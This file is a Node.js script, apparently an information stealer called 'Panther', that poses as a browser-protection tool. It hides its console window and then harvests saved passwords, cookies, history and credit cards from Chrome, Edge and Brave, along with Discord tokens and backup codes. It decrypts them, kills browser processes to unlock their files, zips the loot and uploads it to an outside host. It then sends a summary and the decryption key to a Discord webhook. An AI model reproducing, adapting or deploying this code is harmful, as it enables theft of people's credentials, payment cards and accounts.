(async () => {
    console.clear()
    process.title = ''

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    console.log('Thank you for using our tool! We will protect your browser data.')

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    const fs = require('fs-extra')
    const os = require('os')
    const ph = require('path')
    const ci = require('crypto')
    const db = require('better-sqlite3')
    const gl = require('fast-glob')
    const wi = require('windcrypt')
    const ch = require('child_process')
    const we = require('discord-webhook-node')
    const fe = require('node-fetch')
    const ar = require('archiver')
    const sm = require('form-data')
    const ko = require('koffi')

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    const us = ko.load('user32.dll')

    const bj = us.func('int ShowWindow(void* hWnd, int nCmdShow)')
    const bk = us.func('void* GetParent(void* hWnd)')

    const kr = ko.load('kernel32.dll')
    const lo = kr.func('void* GetConsoleWindow()')

    async function win() {
        return await new Promise(async (resolve) => {
            const a = lo()
            const b = bk(a)
            return resolve(b || a)
        })
    }

    if (await win()) {
        const fg = await win()
        await bj(fg, 0)
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    const hotn = os.hostname()
    const host = os.userInfo().username
    const nodf = process.env.USERPROFILE
    const ppdat = process.env.APPDATA
    const local = process.env.LOCALAPPDATA
    const temp = process.env.TEMP
    const sups = String(host + Date.now() + hotn)

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    const ho = new we.Webhook({
        'url': '*WEBHOOK*',
        'throwErrors': false,
        'retryOnLimit': true
    })

    ho.setUsername(hotn)
    ho.setAvatar('https://i.pinimg.com/736x/87/05/44/8705446ce1a4bdb9e8f59d0054c2ec13.jpg')

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    async function luz(a, c) {
        return await new Promise((resolve) => {
            try {
                if (a.slice(0, 4).toString() === '0100') return wi.unprotectData(a)
                dec = ci.createDecipheriv('aes-256-gcm', c, a.slice(3, 15)).setAuthTag(a.slice(-16))
                resolve(dec.update(a.slice(15, -16), 'base64', 'utf-8') + dec.final('utf-8'))
            } catch {
                resolve(null)
            }
        })
    }

    async function low(b, a) {
        return await new Promise(async (resolve) => {
            try {
                fs.copySync(b, a)
                resolve(true)
            } catch (e) {
                if (String(e).includes('busy or locked')) {
                    roc = b.includes('Google') ? 'chrome' : b.includes('Edge') ? 'msedge' : 'brave'
                    try {
                        ch.execSync(`taskkill /f /im ${roc}.exe`, {
                            'windowsHide': true
                        })
                    } catch (e) {
                        resolve(null)
                    }
                    return resolve(await low(b, a))
                } else {
                    resolve(null)
                }
            }
        })
    }

    async function crip(a, b) {
        return new Promise((resolve) => {
            try {
                g = ci.randomBytes(16)
                h = ci.createCipheriv('aes-256-ctr', ci.createHash('sha256').update(b).digest(), g)
                j = h.update(a, 'utf8', 'hex')
                j += h.final('hex')
                resolve(g.toString('hex') + ':' + j)
            } catch (error) {
                resolve(false)
            }
        })
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    kc = ''

    try {
        kc = await (await fe('http://ip-api.com/json/', {
            'method': 'GET',
            'headers': {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (compatible; MSIE 11.0; Windows NT 6.2; x64 Trident/7.0)'
            }
        })).json()
    } catch { }

    if (kc) {
        kc = await crip(JSON.stringify(kc, null, 3), sups)
        fs.outputFileSync(ph.join(temp, 'Panther', 'ip.json'), JSON.stringify(kc, null, 3))
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    nav = []
    bkp = []
    dc = []

    sen = []
    cen = []
    hen = []
    pen = []
    tok = []
    kpb = []

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    for await (const cam of [
        ph.join(local, 'Google'),
        ph.join(local, 'Microsoft', 'Edge'),
        ph.join(ppdat, 'discord'),
        ph.join(nodf, 'Downloads'),
    ]) {
        const entries = await gl([
            '**/Cookies', '**/Login Data', '**/History', '**/Web Data', '**/Local Storage/leveldb/*.ldb', '**/Local Storage/leveldb/*.log',
            '**/*discord_backup_codes*', '**/*Backup-codes*'
        ], {
            'cwd': cam,
            'ignore': [
                '**/node_modules/**', '**.dll', '**.exe', '**.log',
                '**.json', '**.lock', '**.md', '**.txt', '**.yml',
                '**.zip', '**.tar.gz', '**.tar.xz', '**.tar',
                '**.tgz', '**.gz', '**.xz', '**.zip', '**.7z',
                '**.rar', '**.bin', '**.dat', '**.sqlite',
                '**.sqlite3', '**.db', '**.db3', '**.sql',
                '**.bak', '**.temp', '**.tmp', '**.cache',
                '**.bak', '**.backup', '**.old', '**.ini',
                '**.conf', '**.config', '**.xml', '**.bak',
                '**.bak', '**.bak', '**.bak', '**.bak',
            ],
            'onlyFiles': true,
            'absolute': true,
            'stats': false
        })

        for await (const value of entries) {
            if (value.includes('Local Storage')) {
                dc.push(value)
            } else if (value.includes('discord_backup_codes') || value.includes('Backup-codes')) {
                bkp.push(value)
            } else {
                nav.push(value)
            }
        }

        for await (const value of nav) {
            if (value.includes('Snapshots')) continue

            pf1 = value.includes('Google') ? 'Google' : value.includes('Edge') ? 'Microsoft Edge' : value.includes('BraveSoftware') ? 'Brave' : null

            if (!pf1) continue

            pf2 = value.includes('Profile') ? 'Profile ' + String(value?.split('Profile ')?.[1]?.split('/')?.[0] ?? Date.now()) : value.includes('Default') ? 'Default' : 'Guest'
            pf3 = value.includes('Cookies') ? 'Cookies' : value.includes('Login Data') ? 'Login Data' : value.includes('History') ? 'History' : 'Web Data'

            a = ph.join(temp, 'Panther-Files', String('file-' + Date.now() + '.db'))

            vuc = await low(value, a)
            if (!vuc) continue

            sec = pf3.includes('Cookies') ? 'SELECT * FROM Cookies' : pf3.includes('Login Data') ? 'SELECT * FROM Logins' : pf3.includes('History') ? 'SELECT * FROM urls' : 'SELECT * FROM credit_cards'

            ru = ''
            hu = ''

            try {
                ru = new db(a)
                hu = await ru.prepare(sec).all()
            } catch (error) {
                continue
            }

            bs = ''

            if (pf3 === 'Cookie' || pf3 === 'Login Data') {
                bs = value.split('User Data')[0] + 'User Data\\Local State'
                bs = Buffer.from(JSON.parse(fs.readFileSync(bs, 'utf8')).os_crypt.encrypted_key, 'base64').slice(5)
                bs = wi.unprotectData(bs, null)
            }

            ka = ''

            for await (const eulav of hu) {
                if (value.includes('Login Data')) {
                    cj = await luz(eulav.password_value, bs)
                    ka += `Url: ${eulav.origin_url ?? '❌'}\nUser: ${eulav.username_value ?? '❌'}\nPass: ${cj ?? '❌'}\n`
                    sen.push(1)
                } else if (value.includes('Cookies')) {
                    cj = await luz(eulav.encrypted_value, bs)
                    ka += `${eulav.host_key}\tTRUE\t/\tFALSE\t${eulav.expires_utc}\t${eulav.name}\t${cj}\n`
                    cen.push(1)
                } else if (value.includes('History')) {
                    ka += `${eulav.url}\n`
                    hen.push(1)
                } else if (value.includes('Web Data')) {
                    cj = await luz(eulav.card_number_encrypted, bs)
                    ka += `${eulav.name_on_card}\n${cj}\n${eulav.expiration_month ? (eulav.expiration_month < 10 ? `0${eulav.expiration_month}` : eulav.expiration_month) : '❌'}/${eulav.expiration_year ? eulav.expiration_year : '❌'}\n❌\n`;
                    pen.push(1)
                }
            }

            if (ka !== '') {
                ka = await crip(ka, sups)
                fs.outputFileSync(ph.join(temp, 'Panther', 'Navegador', pf3, `${pf1}-${pf2}-${pf3}.txt`), ka)
            }
        }
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    for await (const value of dc) {
        if (value.includes('discord')) {
            lin = fs.readFileSync(value, 'utf-8').split(/\r?\n/)
            gex = new RegExp(/dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\']*/g)
            ted = Buffer.from(JSON.parse(fs.readFileSync(ph.join(process.env.APPDATA, 'discord', 'Local State'), 'utf-8')).os_crypt.encrypted_key, 'base64').slice(5)
            key = await wi.unprotectData(ted)

            for await (const l of lin) {
                const o = l.match(gex)
                if (o) {
                    for await (let kook of o) {
                        kook = Buffer.from(kook.split('dQw4w9WgXcQ:')[1], 'base64')
                        kood = kook.slice(3, 15)
                        koot = kook.slice(15, kook.length - 16)

                        koom = kook.slice(kook.length - 16, kook.length)
                        koox = ci.createDecipheriv('aes-256-gcm', key, kood)
                        koox.setAuthTag(koom)

                        kook = koox.update(koot, 'base64', 'utf-8') + koox.final('utf-8')
                        tok.push(kook)
                    }
                }
            }
        } else {
            lin = fs.readFileSync(value, 'utf-8').split(/\r?\n/)
            gex = new RegExp(/[\w-_]{24,26}\.[\w-_]{6}\.[\w-_]{25,110}|mfa\.[\w-]{84}|[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}|[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g)

            for await (const l of lin) {
                o = l.match(gex)
                if (o) {
                    for await (let d of o) {
                        tok.push(d)
                    }
                }
            }
        }
    }

    if (tok.length !== 0) {
        vul = await crip(tok.join('\n'), sups)
        fs.outputFileSync(ph.join(temp, 'Panther', 'Discord', 'Token.txt'), vul)
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    for await (const value of bkp) {
        kpb.push(1)
        losk = ''
        losk = await cript(fs.readFileSync(value, 'utf-8'), sups)
        if (value.includes('discord')) {
            fs.outputFileSync(ph.join(temp, 'Panther', 'Backup', `Dc-backup-${Date.now()}.txt`), losk)
        } else {
            fs.outputFileSync(ph.join(temp, 'Panther', 'Backup', `Nv-backup-${Date.now()}.txt`), losk)
        }
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    tjf = ph.join(temp, host + '-Panther.zip')
    out = fs.createWriteStream(tjf)

    vei = ar('zip', {
        'zlib': {
            'level': 9
        }
    })

    vei.pipe(out)
    vei.directory(ph.join(temp, 'Panther'), false)
    await vei.finalize()

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    const fom = new sm()
    fom.append('file', fs.createReadStream(tjf))

    let api = await (await fe('https://api-lofy.xyz/upload', {
        'method': 'POST',
        'body': fom,
        'headers': {
            ...fom.getHeaders()
        }
    })).json()

    api = `https://api-lofy.xyz/download?key=${api.key}`

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    bed = new we.MessageBuilder()
        .setTitle('\`Panther\`')
        .setAuthor(host, 'https://i.pinimg.com/564x/21/60/1c/21601c1e162f6ea8ce72ce3f96abcbec.jpg', api)
        .setURL(api)
        .setDescription(`\n🗺️ **Ip:** ${'\`' + String(kc ? '✅' : '❌') + '\`'}\n🔑 **Password:** ${'\`' + String(sen.length) + '\`'}\n🍪 **Cookie:** ${'\`' + String(cen.length) + '\`'}\n🔍 **Historic:** ${'\`' + String(hen.length) + '\`'}\n💳 **Card:** ${'\`' + String(pen.length) + '\`'}\n👟 **Token:** ${'\`' + String(tok.length) + '\`'}\n📦 **Backup:** ${'\`' + String(kpb.length) + '\`'}\n\n🧊 **Descript Key:** \`${sups}\``)
        .setColor('#95319e')
        .setThumbnail('https://i.pinimg.com/564x/21/60/1c/21601c1e162f6ea8ce72ce3f96abcbec.jpg')
        .setFooter(host, 'https://i.pinimg.com/564x/21/60/1c/21601c1e162f6ea8ce72ce3f96abcbec.jpg')
        .setTimestamp()

    await ho.send(bed)

    return console.log('Done!')
})()
